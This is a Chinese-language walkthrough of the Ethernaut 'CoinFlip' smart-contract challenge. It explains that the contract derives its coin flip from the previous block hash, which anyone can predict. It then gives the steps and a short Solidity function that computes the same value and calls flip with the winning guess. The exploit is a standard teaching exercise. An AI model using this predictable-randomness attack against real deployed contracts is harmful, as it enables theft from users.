# CoinFlip
## Reference
[CoinFlip](https://ethernaut.openzeppelin.com/level/3)

[Sol](https://github.com/yuhuajing/ethernaut-book/blob/main/src/03-CoinFlip/CoinFlip.sol)

## 目标
1. 在10次之内猜出当前合约中硬币的正反面

## 分析
### block.number
```solidity
    function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
        revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
        consecutiveWins++;
        return true;
    } else {
        consecutiveWins = 0;
        return false;
    }
}
```
1. 在猜正反环节
   1. 首先计算当前区块高度的哈希值：`uint256(blockhash(block.number - 1))`
   2. 哈希值除以固定值，得到预期的正反值
   3. 和输入的猜测值对比
2. `block.number`是递增并且全网公开的值

## 实现步骤
1. 部署合约
2. 链下获取当前的区块高度后，直接在链下按照合约逻辑计算正确答案
3. 计算出答案后，设置高`gasPrice`抢先交易
4. 持续 2，3 步骤，直到抢先成功赢得`Game`
```solidity
    function winGame() public payable {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (lastHash == blockValue) {
            revert();
        }
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        cf.flip(side);
        Assert.equal(cf.consecutiveWins(), 1, "Win once");
    }
```
